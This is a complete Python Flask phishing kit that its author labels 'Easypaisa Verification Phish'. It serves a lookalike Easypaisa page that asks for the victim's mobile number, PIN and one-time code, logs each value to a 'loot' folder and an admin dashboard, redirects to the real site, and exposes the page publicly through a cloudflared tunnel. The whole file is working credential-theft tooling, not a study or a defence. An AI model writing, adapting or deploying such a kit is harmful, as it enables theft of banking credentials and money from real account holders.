#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════
#   Easypaisa Verification Phish  —  by Asghar
# ═══════════════════════════════════════════════════════

import os, sys, json, time, threading, subprocess, shutil, argparse, socket, uuid
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

APP  = Flask(__name__)
ROOT = os.path.dirname(os.path.abspath(__file__))
LOOT = os.path.join(ROOT, "loot")
os.makedirs(LOOT, exist_ok=True)
HITS = {}

PAGE = """
<!DOCTYPE html><html><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Easypaisa - Verification</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
body{background:linear-gradient(180deg,#f4f9f4,#e8f4ea);min-height:100vh;padding:20px;color:#0d2a12}
.wrap{max-width:420px;margin:0 auto}
.head{background:linear-gradient(135deg,#00a651,#008a42);border-radius:16px;padding:22px;text-align:center;box-shadow:0 8px 30px rgba(0,166,81,.25);margin-bottom:18px}
.logo{font-size:26px;font-weight:800;color:#fff;letter-spacing:-.5px}
.head p{color:rgba(255,255,255,.85);font-size:13px;margin-top:8px}
.card{background:#fff;border-radius:16px;padding:26px 22px;box-shadow:0 4px 20px rgba(0,0,0,.06)}
.dots{display:flex;align-items:center;margin-bottom:22px}
.dot{width:32px;height:32px;border-radius:50%;background:#e8f4ea;color:#7a9a80;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700}
.dot.on{background:#00a651;color:#fff;box-shadow:0 0 0 4px rgba(0,166,81,.15)}
.line{flex:1;height:2px;background:#e8f4ea;margin:0 8px}
h1{font-size:18px;margin-bottom:6px}
p.s{font-size:13px;color:#6b806e;line-height:1.5;margin-bottom:18px}
label{display:block;font-size:12px;font-weight:600;color:#3b5a42;margin-bottom:6px}
input{width:100%;padding:14px;font-size:16px;background:#f8fbf8;color:#0d2a12;border:1.5px solid #d7e5d9;border-radius:10px;outline:none;letter-spacing:1px;margin-bottom:12px}
input:focus{border-color:#00a651;background:#fff}
button{width:100%;padding:15px;font-size:15px;font-weight:700;background:linear-gradient(135deg,#00a651,#008a42);color:#fff;border:none;border-radius:10px;cursor:pointer;box-shadow:0 6px 20px rgba(0,166,81,.3);margin-top:4px}
button:active{transform:scale(.98)}
.info{background:#f0f8f1;border-left:3px solid #00a651;padding:12px 14px;border-radius:8px;font-size:12px;color:#3b5a42;line-height:1.4;margin-bottom:18px}
.foot{text-align:center;margin-top:20px;font-size:11px;color:#8a9c8e;padding-bottom:20px}
.hide{display:none!important}
</style></head><body>
<div class="wrap">
<div class="head"><div class="logo">easypaisa</div><p>Account Verification Required</p></div>
<div class="card">
<div class="dots"><div class="dot on" id="d1">1</div><div class="line"></div><div class="dot" id="d2">2</div><div class="line"></div><div class="dot" id="d3">3</div></div>
<div class="info">🔒 Your account needs verification to continue using services.</div>

<div id="s1">
<h1>Enter Mobile Number</h1><p class="s">Enter the mobile number registered with Easypaisa.</p>
<label>Mobile Number</label>
<input id="mobile" type="tel" placeholder="03XX-XXXXXXX"/>
<button onclick="go2()">Continue</button>
</div>

<div id="s2" class="hide">
<h1>Enter Your PIN</h1><p class="s">For security, enter your 4-digit Easypaisa PIN.</p>
<label>4-Digit PIN</label>
<input id="pin" type="password" maxlength="4" placeholder="••••"/>
<button onclick="go3()">Verify</button>
</div>

<div id="s3" class="hide">
<h1>Enter OTP</h1><p class="s">We sent a 6-digit code to your mobile.</p>
<label>6-Digit OTP</label>
<input id="otp" maxlength="6" placeholder="● ● ● ● ● ●"/>
<button onclick="submitAll()">Verify &amp; Complete</button>
</div>

</div>
<div class="foot">🔒 Secured by State Bank of Pakistan<br/>© 2026 Easypaisa · Telenor Microfinance Bank</div>
</div>
<script>
const SID = "{{ sid }}";
function go2(){
  const m = document.getElementById('mobile').value.trim();
  if(!m) return alert('Enter mobile number');
  fetch('/partial',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:SID,step:1,mobile:m})});
  document.getElementById('s1').classList.add('hide');
  document.getElementById('s2').classList.remove('hide');
  document.getElementById('d1').classList.remove('on');
  document.getElementById('d2').classList.add('on');
}
function go3(){
  const p = document.getElementById('pin').value.trim();
  if(p.length!==4) return alert('Enter 4-digit PIN');
  fetch('/partial',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:SID,step:2,pin:p})});
  document.getElementById('s2').classList.add('hide');
  document.getElementById('s3').classList.remove('hide');
  document.getElementById('d2').classList.remove('on');
  document.getElementById('d3').classList.add('on');
}
function submitAll(){
  const o = document.getElementById('otp').value.trim();
  if(o.length!==6) return alert('Enter 6-digit OTP');
  fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:SID,otp:o})})
    .then(()=>{ document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;padding:24px;font-family:sans-serif"><div><div style="font-size:60px">✓</div><h1 style="color:#00a651;margin:14px 0">Verification Complete</h1><p style="color:#6b806e">Redirecting…</p></div></div>'; setTimeout(()=>location.href='https://easypaisa.com.pk/',3000); });
}
</script></body></html>
"""

@APP.route("/")
def index():
    sid = uuid.uuid4().hex[:10]
    ip  = request.remote_addr or "?"
    HITS[sid] = {"sid":sid,"ip":ip,"ua":request.headers.get("User-Agent",""),
                 "mobile":None,"pin":None,"otp":None,"time":datetime.now().strftime("%H:%M:%S")}
    print(f"  [+] visit   {sid}  {ip}")
    return render_template_string(PAGE, sid=sid)

@APP.route("/partial", methods=["POST"])
def partial():
    d = request.get_json(silent=True) or {}
    sid = d.get("sid"); step = d.get("step")
    r = HITS.get(sid)
    if not r: return jsonify(ok=False)
    if step == 1 and d.get("mobile"):
        r["mobile"] = d["mobile"]; print(f"  📱 {sid}  mobile: {r['mobile']}")
    if step == 2 and d.get("pin"):
        r["pin"] = d["pin"]; print(f"  🔐 {sid}  pin: {r['pin']}")
    return jsonify(ok=True)

@APP.route("/capture", methods=["POST"])
def capture():
    d = request.get_json(silent=True) or {}
    sid = d.get("sid"); r = HITS.get(sid)
    if not r: return jsonify(ok=False)
    r["otp"] = d.get("otp","")
    print()
    print("  ╔════════════════════════════════════════════╗")
    print("  ║  🎯  FULL CAPTURE  —  Easypaisa            ║")
    print("  ╠════════════════════════════════════════════╣")
    print(f"  ║  Mobile : {r['mobile']}")
    print(f"  ║  PIN    : {r['pin']}")
    print(f"  ║  OTP    : {r['otp']}")
    print(f"  ║  IP     : {r['ip']}")
    print("  ╚════════════════════════════════════════════╝")
    print()
    day = datetime.utcnow().strftime("%Y-%m-%d")
    dd = os.path.join(LOOT, day); os.makedirs(dd, exist_ok=True)
    with open(os.path.join(dd,"hits.jsonl"),"a") as f:
        f.write(json.dumps({"by":"Asghar","ts":datetime.utcnow().isoformat()+"Z",**r})+"\n")
    return jsonify(ok=True)

@APP.route("/admin")
def admin():
    return """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin - Asghar</title>
    <style>body{background:#0a1a10;color:#eee;font-family:monospace;padding:20px;margin:0}
    h1{color:#00a651;font-size:16px}.h{background:#0d2818;border:1px solid #1a4a2a;border-radius:8px;padding:14px;margin-bottom:10px}
    .r{display:flex;justify-content:space-between;font-size:13px;padding:2px 0}.k{color:#5a8065}
    .m{color:#ffd700}.p,.o{color:#ff6b6b;font-weight:bold}.e{color:#5a8065;text-align:center;padding:40px}</style></head>
    <body><h1>📱 Easypaisa Captured — by Asghar</h1><div id="l"></div>
    <script>async function r(){const d=await(await fetch('/api/hits')).json();const el=document.getElementById('l');
    if(!d.length){el.innerHTML='<div class=e>waiting…</div>';return}
    el.innerHTML=d.map(h=>`<div class=h><div class=r><span class=k>${h.time||''}</span><span>${h.otp?'✓ COMPLETE':'pending'}</span></div>
    <div class=r><span class=k>Mobile</span><span class=m>${h.mobile||'—'}</span></div>
    <div class=r><span class=k>PIN</span><span class=p>${h.pin||'—'}</span></div>
    <div class=r><span class=k>OTP</span><span class=o>${h.otp||'—'}</span></div>
    <div class=r><span class=k>IP</span><span>${h.ip||''}</span></div></div>`).join('')}
    setInterval(r,3000);r()</script></body></html>"""

@APP.route("/api/hits")
def api_hits():
    return jsonify(list(HITS.values()))

def tunnel(port):
    for _ in range(40):
        s=socket.socket(); s.settimeout(0.4)
        try:
            if s.connect_ex(("127.0.0.1",port))==0: break
        finally: s.close()
        time.sleep(0.25)
    if not shutil.which("cloudflared"):
        print("[!] cloudflared not found — install it or use ngrok manually")
        return
    print("[*] starting cloudflared tunnel...")
    p = subprocess.Popen(["cloudflared","tunnel","--url",f"http://localhost:{port}","--no-autoupdate"],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    end = time.time()+25
    for line in iter(p.stdout.readline,""):
        if time.time()>end: break
        if "trycloudflare.com" in line:
            for tok in line.split():
                if tok.startswith("https://") and "trycloudflare" in tok:
                    print()
                    print("  ╔════════════════════════════════════════╗")
                    print(f"  ║  🎯 PUBLIC LINK                        ║")
                    print(f"  ║  {tok}")
                    print(f"  ║  admin: {tok}/admin")
                    print(f"  ║  by: Asghar")
                    print("  ╚════════════════════════════════════════╝")
                    print()
                    return

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--no-tunnel", action="store_true")
    a = ap.parse_args()
    print()
    print("  ═══════════════════════════════════════════")
    print("   Easypaisa Verification Phish  —  by Asghar")
    print("  ═══════════════════════════════════════════")
    print(f"  local  : http://127.0.0.1:{a.port}/")
    print(f"  admin  : http://127.0.0.1:{a.port}/admin")
    print(f"  loot   : {LOOT}")
    print()
    if not a.no_tunnel:
        threading.Thread(target=tunnel, args=(a.port,), daemon=True).start()
    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    APP.run(host="0.0.0.0", port=a.port, debug=False, threaded=True, use_reloader=False)

if __name__ == "__main__":
    main()
